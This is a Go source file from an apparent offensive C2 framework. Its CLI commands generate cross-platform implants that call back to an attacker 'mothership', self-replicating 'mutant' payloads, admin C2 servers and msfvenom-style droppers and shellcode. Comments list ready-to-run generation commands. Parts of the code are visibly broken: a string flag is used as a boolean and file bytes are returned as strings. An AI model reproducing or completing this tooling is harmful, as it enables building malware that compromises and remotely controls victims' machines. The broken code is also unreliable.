package cmd

import (
  //"os"
  "fmt"
  "time"
  "io/ioutil"

  "odin/lib/c2"
  "odin/builder"
  "odin/lib/utils"
  "github.com/spf13/cobra"
)

var StartTime = time.Now()

var cmdImplantGenerate = &cobra.Command{
	Use: "generate",
	Short: "Generate mule/minion/payload",
	Long:"Generate a mule/minion/payload which can be a .exe/.elf or a shared library (.dll/.so) or a macro",
	//Args: cobra.MinimumNArgs[]
  Run: func(cmd *cobra.Command,args []string){
    name,_ := cmd.Flags().GetString("name")
    format,_ := cmd.Flags().GetString("f")// ./exe/.elf/.dll/.so
    ops,_ := cmd.Flags().GetString("ops")
    lhost,_ := cmd.Flags().GetString("lhost")
    lport,_ := cmd.Flags().GetString("lport")
    msAddress,_ := cmd.Flags().GetString("msaddr")
    architecture,_ := cmd.Flags().GetString("arch")
    msid,_ := cmd.Flags().GetString("msid")
    entry,_ := cmd.Flags().GetString("entry")
    //generate a binary file
    sesn := RunningSessions.NewSession(name,msid, StartTime.AddDate(1,0,0).String(),SessionsDriver)
    bob,err := builder.CreateBuilder(architecture,ops,format,"basic",name,entry,true)
    if err != nil {
      utils.Logerror(err)
      return
    }
    ma := c2.CreateMinion(msid,name,msAddress,lhost,utils.StringToInt(lport),sesn,false)
    var g builder.Generator
    g = &builder.MinionGenerate{ ma,bob }
    err = g.Generate()
    if err!= nil {
      utils.Logerror(err);return
    }
  },
}
/*
  LINUX archs arm,arm64,386,amd64
  generate --name test_ --f elf --ops lin --lhost 127.0.0.1 --lport 44566  --arch x64  --msid 74ba493d4be29fb05c91e9f8f45bc8fe
  generate-mutant --name mutant --f so --ops lin --lhost 127.0.0.1 --lport 44566  --arch x64  --msid fa81cec958b46740479ea2b275125fc4

  Windows archs 386,amd64,arm,arm64
  generate --name bb_exe_test_minion --f exe --ops win --lhost 127.0.0.1 --lport 44566  --arch x64  --msid 6fa8501c0d8cbad5d7d727b2437be84f
  generate --name done --f dll --ops win --lhost 127.0.0.1 --lport 44566  --arch x64  --msid fa81cec958b46740479ea2b275125fc4

  Adndroid archs (386,amd64,arm.arm64)
  generate --name live --f apk --ops lin --lhost 127.0.0.1 --lport 44566  --arch amd64  --msid fa81cec958b46740479ea2b275125fc4
  generate --name 6bp --f so --ops lin --lhost 127.0.0.1 --lport 44568  --arch x64  --msid e6a254a8df5b7abbb53cee3f12ab1087

  MAC archs amd64arm64
   generate --name demo --f dll --ops win --lhost 127.0.0.1 --lport 44566  --arch x64  --msid a4b1cdae6390d4416eaa5a7a378a0745
   generate --name demo --f exe --ops win --lhost 127.0.0.1 --lport 44566  --arch x64  --msid 613625ad3dd6bd45cb7cb91293075826

  IOS Archs amd64,arm64
  generate --name demo --f ios --ops win --lhost 127.0.0.1 --lport 44566  --arch amd64  --msid a4b1cdae6390d4416eaa5a7a378a0745
  generate --name demo --f so --ops win --lhost 127.0.0.1 --lport 44566  --arch arm64  --msid 613625ad3dd6bd45cb7cb91293075826

  JS
  generate --name demo --f js --ops js --lhost 127.0.0.1 --lport 44566  --arch wasm  --msid a4b1cdae6390d4416eaa5a7a378a0745
*/


//platform
//format
//architecture
//embed and godonut
var cmdAdminGenerate = &cobra.Command{
  Use: "gen-admin",
  Short: "Generate an admin C2 to use anywhere on the fly.",
  Long: `An admin impalnt is a C2 that ca be used anywhere. Once installed and running, implants can connect to it
          from anywhere allowing you to have multiple C2's at a time.`,
  Run: func(cmd *cobra.Command,args []string){
    // inouts for an admin C2
    name,err := cmd.Flags().GetString("name")
    if err != nil {
      utils.Logerror(err)
      return
    }
    iProtocol,_ := cmd.Flags().GetString("iprotocol")
    oProtocol,_ := cmd.Flags().GetString("oprotocol")
    oPort,_ := cmd.Flags().GetString("oport")
    iPort,_ := cmd.Flags().GetString("iport")
    arch,_ := cmd.Flags().GetString("arch")
    format,_ := cmd.Flags().GetString("f")
    osType,_ := cmd.Flags().GetString("os")
    address,_ := cmd.Flags().GetString("addr")
    pass,_ := cmd.Flags().GetString("pass")
    entry,_ := cmd.Flags().GetString("entry")
    tls,_ := cmd.Flags().GetString("entry")
    keyCrtFile,_ := cmd.Flags().GetString("keyCrtFile")
    certFile,_ := cmd.Flags().GetString("certFile")
    if pass == ""|| len(pass) < 0{
      utils.Logerror(fmt.Errorf("password cannot be empty"))
      return
    }
    hash,err := utils.HashPassword(pass)
    if err != nil {
      utils.Logerror(fmt.Errorf("Error generating password hash: %v",err))
      return
    }
    if tls {
      cert,keyCrt,err := OpenCertFile(keyCrtFile,certFile)
      if err != nil{
        utils.Logerror(err);return
      }
      adminC2 :=  c2.CreateAdminC2(hash,name,utils.Md5Hash(utils.RandString(10)),address,iProtocol,oProtocol,cert,keyCrt,utils.StringToInt(iPort),utils.StringToInt(oPort),true)
      bob,err := builder.CreateBuilder(arch,osType,format,"basic",name,entry,false)
      if err != nil {
        utils.Logerror(err)
        return
      }
      var g builder.Generator
      g = &builder.MSGenerate {adminC2,bob}
      err = g.Generate()
      if err != nil {
        utils.Logerror(err)
        return
      }
      //add to connectors with nil values
      _ = Conns.NewConnector(adminC2.MSId,address+":"+iPort,address+":"+oPort,name,ConnectorsDriver)
    } else {
      adminC2 :=  c2.CreateAdminC2(hash,name,utils.Md5Hash(utils.RandString(10)),address,iProtocol,oProtocol,"","",utils.StringToInt(iPort),utils.StringToInt(oPort),false)
      bob,err := builder.CreateBuilder(arch,osType,format,"basic",name,entry,false)
      if err != nil {
        utils.Logerror(err)
        return
      }
      var g builder.Generator
      g = &builder.MSGenerate {adminC2,bob}
      err = g.Generate()
      if err != nil {
        utils.Logerror(err)
        return
      }
      //add to connectors with nil values
      _ = Conns.NewConnector(adminC2.MSId,address+":"+iPort,address+":"+oPort,name,ConnectorsDriver)
    }
  },
}
/*
  Linux Admins archs arm,arm64,386,amd64
  gen-admin --iprotocol tcp --oprotocol tcp --oport 45565  --iport  44566 --arch x64 --os lin --f elf --addr 0.0.0.0 --pass Qwerty --name try
  gen-admin --name groot --iprotocol tcp --oprotocol tcp --oport 45567  --iport  44568 --arch x64 --os lin --f so --addr 0.0.0.0 --pass Qwerty
  SHELLCODE(Unsurported for now) Just use hunter and spike your arrows
  gen-admin --name groot --iprotocol tcp --oprotocol tcp --oport 45567  --iport  44568 --arch x64 --os lin --f bin --addr 0.0.0.0 --pass Qwerty

  Windows Admins 386,amd64,arm,arm64
  gen-admin --name home --iprotocol tcp --oprotocol tcp --oport 45566  --iport  44566 --arch x64 --os win --f exe --addr 0.0.0.0 --pass Qwerty
  gen-admin --name home --iprotocol tcp --oprotocol tcp --oport 45566  --iport  44566 --arch x64 --os win --f dll --addr 0.0.0.0 --pass Qwerty
  SHELLCODE
  gen-admin --name home --iprotocol tcp --oprotocol tcp --oport 45566  --iport  44566 --arch x64 --os win --f bin --addr 0.0.0.0 --pass Qwerty


  Adndroid admins archs (386,amd64,arm.arm64)
  // gen-admin --name sw --iprotocol tcp --oprotocol tcp --oport 45566  --iport  44566 --arch x64 --os android --f apk --addr 0.0.0.0 --pass Qwerty
  gen-admin --name sw --iprotocol tcp --oprotocol tcp --oport 45566  --iport  44566 --arch x64 --os android --f apk --addr 0.0.0.0 --pass Qwerty

  Mac admins  archs amd64arm64
  gen-admin --name mac --iprotocol tcp --oprotocol tcp --oport 45566  --iport  44566 --arch amd64 --os mac --f mac --addr 0.0.0.0 --pass Qwerty

  JS
  gen-admin --name js --iprotocol tcp --oprotocol tcp --oport 45566  --iport  44566 --arch wasm --os js --f mac --addr 0.0.0.0 --pass Qwerty
*/
var cmdGenerateMutant = &cobra.Command{
  Use: "generate-mutant",
  Short: "A mutant is a universal payload that can be used anywhere. Keeps replicating itself.",
  Run: func(cmd *cobra.Command,args []string){
    name,_ := cmd.Flags().GetString("name")
    format,_ := cmd.Flags().GetString("f")// ./exe/.elf/.dll/.so
    ops,_ := cmd.Flags().GetString("ops")
    lhost,_ := cmd.Flags().GetString("lhost")
    lport,_ := cmd.Flags().GetString("lport")
    msAddress,_ := cmd.Flags().GetString("msaddr")
    architecture,_ := cmd.Flags().GetString("arch")
    msid,_ := cmd.Flags().GetString("msid")
    entry,_ := cmd.Flags().GetString("entry")
    //generate a binary file
    sesn := RunningSessions.NewSession(name+"_mutant",msid + "mutant", StartTime.AddDate(10,0,0).String(),SessionsDriver)
    bob,err := builder.CreateBuilder(architecture,ops,format,"basic",name,entry,true)
    if err != nil {
      utils.Logerror(err)
      return
    }
    ma := c2.CreateMinion(msid+"mutant",name+"_mutant",msAddress,lhost,utils.StringToInt(lport),sesn,false)
    var g builder.Generator
    //let's add a mutant generate
    g = &builder.MinionGenerate{ ma,bob }
    err = g.Generate()
    if err!= nil {
      utils.Logerror(err);return
    }
  },
}
var cmdManualDBSave = &cobra.Command{
	Use: "save",
	Short: "Manually save an unsaved or connection or session.",
	Run: func(cmd *cobra.Command,args []string){
		conct,_ :=  cmd.Flags().GetString("con")
		sesn,_ :=  cmd.Flags().GetString("ses")
		if utils.CheckifStringIsEmpty(conct){
			//get it from current connections first
			cnt,err := Conns.GetConn(conct)
			if err != nil{
				utils.Logerror(err)
				return
			}
			err = Conns.SaveConnection(cnt,ConnectorsDriver)
			if err != nil{
  			utils.Logerror(err)
  			return
  		}
  		utils.PrintTextInASpecificColor("blue","Connection Saved to DB Successfully")
  	} else {
      if utils.CheckifStringIsEmpty(sesn){
  			//get session from current sessions
  			ses,err := RunningSessions.GetSession(sesn)
  			if err != nil{
  				utils.Logerror(err)
  				return
  			}
  			if err := RunningSessions.SaveSession(ses,SessionsDriver); err != nil{
  				utils.Logerror(err);return
  			}
  			utils.PrintTextInASpecificColor("blue","Session saved to DB Successfully.")
    	}
    }
  },
}

// was initially meant to be a loader/  a plugin so everyone can implement their own but yeah golang internal issues.
var cmdHunter = &cobra.Command{
  Use: "hunter",
  Short: "generate dropppers and iso's/zip from already generated files ",
  Long: "Created this as a short form of msfvenom. Basically creates droppers and shellcodes",
  Run: func(cmd *cobra.Command, args []string){
    iF,err := cmd.Flags().GetString("iF")
		if err != nil {
			utils.PrintTextInASpecificColor("red","Input file can not be empty")
			return
		}
    oF,err := cmd.Flags().GetString("oF")
		if err != nil {
			utils.PrintTextInASpecificColor("red","Output file can not be empty")
      utils.Logerror(err)
			return
		}
    frmt,err := cmd.Flags().GetString("f")
		if err != nil {
			utils.PrintTextInASpecificColor("red","Input file can not be empty")
			return
		}
    var h builder.Generator
    //let's add a mutant generate
    h = &builder.Hunter{ iF,oF,frmt}
    err = h.Generate()
    if err != nil{
      utils.Logerror(err)
    }
    utils.PrintTextInASpecificColor("yellow","Please don't misuse this functionality...... :)")
  },
}
// hunter --iF ../bin/temp/bd.exe --oF ../bin/bd_modified.exe --f dropper

var cmdHunterHelp = &cobra.Command{
  Use:"hunter-help",
  Short: "Print hunter helpe commands.",
  Run: func(cmd *cobra.Command, args []string){
    builder.HunterHelp()
    return
  },
}

var cmdSurportedArch =  &cobra.Command{
	Use: "sup-archs",
	Short: "Print surported architectures and operating systems.",
	Long: "",
	Run: func(cmd *cobra.Command, args []string){
		for _,arg := range args{
      switch arg {
  			case "windows":
  			case "linux":
  			case "android":
  			case  "js":
  			default:
  				utils.PrintTextInASpecificColorInBold("yellow", "Use windows or linux examples and add this as per your target os.")
  				builder.SupportedArch()
  		}
    }
	},
}
func init(){
  //manual save flags
  cmdManualDBSave.Flags().String("con","con","save --con khjkhkjhlklj")
  cmdManualDBSave.Flags().String("ses","ses","save --ses hlkjnkjjkjii")
  // Mutant flags
  cmdGenerateMutant.Flags().String("name","kimJonYon","Name of implant/shellcode")
  cmdGenerateMutant.Flags().String("f","exe","Frmat for payload/implant")
  cmdGenerateMutant.Flags().String("ops","win","Name of target operating system")
  cmdGenerateMutant.Flags().String("lhost","192.168.1.2","Target IP address of the mothership")
  cmdGenerateMutant.Flags().String("lport","44566","Port of the implant server/Mother ship")
  cmdGenerateMutant.Flags().String("msaddr","example.com","Address of mothership (if tunneled out already) can also be example.com:8080")
  cmdGenerateMutant.Flags().String("arch","x32","Architecture of the target operating system")
  cmdGenerateMutant.Flags().String("msid","dfghu654e","ID of the mothership")
  cmdGenerateMutant.Flags().String("entry","MYENTRYPOINT","Entry point for your .dll or .so or exported function for shared libraries")
  // implant flags
  cmdImplantGenerate.Flags().String("name","kimJonYon","Name of implant/shellcode")
  cmdImplantGenerate.Flags().String("f","exe","Frmat for payload/implant")
  cmdImplantGenerate.Flags().String("ops","win","Name of target operating system")
  cmdImplantGenerate.Flags().String("lhost","192.168.1.2","Target IP address of the mothership")
  cmdImplantGenerate.Flags().String("lport","44566","Port of the implant server/Mother ship")
  cmdImplantGenerate.Flags().String("msaddr","example.com","Address of mothership (if tunneled out already) can also be example.com:8080")
  cmdImplantGenerate.Flags().String("arch","x32","Architecture of the target operating system")
  cmdImplantGenerate.Flags().String("msid","dfghu654e","ID of the mothership")
  cmdImplantGenerate.Flags().String("entry","MYENTRYPOINT","Entry point for your .dll or .so or exported function for shared libraries")
  // admin flags
  cmdAdminGenerate.Flags().String("addr","127.0.0.1","Address for the C2 to bind into (0.0.0.0)")
  cmdAdminGenerate.Flags().String("iprotocol","http","Protocol the implants are running.")
  cmdAdminGenerate.Flags().String("oprotocol","tcp","Protocol the operator is running on.")
  cmdAdminGenerate.Flags().String("iport","44566","Port the implant server is runnig on")
  cmdAdminGenerate.Flags().String("oport","45566","Port the operator will connect to")
  cmdAdminGenerate.Flags().String("name","adminC2","Name of Mothership")
  cmdAdminGenerate.Flags().String("arch","x32","Architecture of the binary")
  cmdAdminGenerate.Flags().String("f","exe","Format of the payload")
  cmdAdminGenerate.Flags().String("os","linux","Operating system type")
  cmdAdminGenerate.Flags().String("pass","Your Password", "Password for communicating with mothership.")
  cmdAdminGenerate.Flags().String("entry","MYENTRYPOINT","Entry point for your .dll or .so or exported function for shared libraries")
  cmdAdminGenerate.Flags().Bool("tls",false,"Set to true and specify key and certfile")
  cmdAdminGenerate.Flags().String("keyCrtFile","../bin/certs/key.pem","key file for the server to be used")
  cmdAdminGenerate.Flags().String("certFile","../bin/certs/cert.pem","Server cert file to be used")
  //cmdAdminGenerate.Flags().Bool("active",true,"Run admin immediatly or wait for a starter.")
  //Hunter flags
  cmdHunter.Flags().String("f","iso","Format for poncupine to implement.")
  cmdHunter.Flags().String("iF","payload.exe","Input file to modify.")
  cmdHunter.Flags().String("oF","modified_payload.exe","Output file to be written into.")
  //root commands
  RootCmd.AddCommand(cmdHunter)
  RootCmd.AddCommand(cmdManualDBSave)
	RootCmd.AddCommand(cmdAdminGenerate)
  RootCmd.AddCommand(cmdImplantGenerate)
  RootCmd.AddCommand(cmdGenerateMutant)
	RootCmd.AddCommand(cmdSurportedArch)
  RootCmd.AddCommand(cmdHunterHelp)
}


var OpenCertFile = func(keyFile,certFile string)(cert,keyCrt string,err error){
  if cert,err = ioutil.ReadFile(certFile); err != nil{
    return "","",fmt.Errorf("Error openning cert file.\nERROR: %q",err)
  }
  if keyCrt,err = ioutil.ReadFile(keyFile); err != nil{
    return "","",fmt.Errorf("Error openning key file.\nERROR: %q",err)
  }
  return
}
